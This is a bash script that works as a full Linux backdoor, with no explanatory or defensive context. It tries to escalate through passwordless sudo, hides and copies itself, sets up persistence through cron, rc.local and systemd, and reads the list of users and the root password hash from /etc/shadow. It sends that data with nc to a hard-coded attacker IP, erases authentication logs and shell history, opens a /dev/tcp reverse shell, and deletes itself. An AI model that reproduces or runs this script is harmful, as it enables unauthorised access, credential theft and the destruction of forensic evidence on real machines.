
#!/bin/bash

ATTACKER_IP="192.168.1.39"  
PORT=4444 
HIDDEN_DIR="/var/tmp/.webservice" 
HIDDEN_FILE="$HIDDEN_DIR/webservice.sh"  
PROCESS_NAME="[webservice]"  
LOG_FILES=("/var/log/auth.log" "/var/log/syslog" "/var/log/utmp" "/var/log/wtmp" "$HOME/.bash_history")
PERSIST_METHODS=(
    "(crontab -l 2>/dev/null | grep -v $HIDDEN_FILE; echo \"* * * * * /bin/bash $HIDDEN_FILE > /dev/null 2>&1\") | crontab -"
    "echo '/bin/bash $HIDDEN_FILE' >> /etc/rc.local"
    "echo '@reboot /bin/bash $HIDDEN_FILE' | crontab -"
    "mkdir -p /etc/systemd/system; echo '[Unit]\nDescription=Web Service\n[Service]\nExecStart=/bin/bash $HIDDEN_FILE\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/webservice.service; systemctl enable webservice.service"
)

if [ $EUID -ne 0 ]; then
    sudo -n true 2>/dev/null && exec sudo /bin/bash "$0" "$@"
    IS_ADMIN="No"
else
    IS_ADMIN="Yes"
fi

mkdir -p "$HIDDEN_DIR"
cp "$0" "$HIDDEN_FILE"
chmod 700 "$HIDDEN_DIR" "$HIDDEN_FILE"
chattr +i "$HIDDEN_DIR" "$HIDDEN_FILE"  # Make immutable
echo "$PROCESS_NAME" > /proc/self/comm  # Hide process name

for method in "${PERSIST_METHODS[@]}"; do
    eval "$method" &> /dev/null
done

INFO="Hostname: $(hostname)
OS: $(uname -a)
IP: $(ip addr show | grep inet | awk '{print $2}' | paste -sd ',')
Users: $(cat /etc/passwd | cut -d: -f1 | paste -sd ',')"

if [ "$IS_ADMIN" = "Yes" ]; then
    ROOT_PASS=$(grep "^root:" /etc/shadow)
    INFO="$INFO\nRoot Shadow: $ROOT_PASS"
else
    INFO="$INFO\nNon-root: Shadow not readable. Other Users: $(grep -v root /etc/passwd | cut -d: -f1,6 | paste -sd ',')"
fi

echo "sono connesso! Admin: $IS_ADMIN" | nc $ATTACKER_IP $PORT
echo -e "$INFO" | nc $ATTACKER_IP $PORT
for log in "${LOG_FILES[@]}"; do
    [ -f "$log" ] && echo "" > "$log"
done

(exec -a "$PROCESS_NAME" bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1) &

rm -f "$0"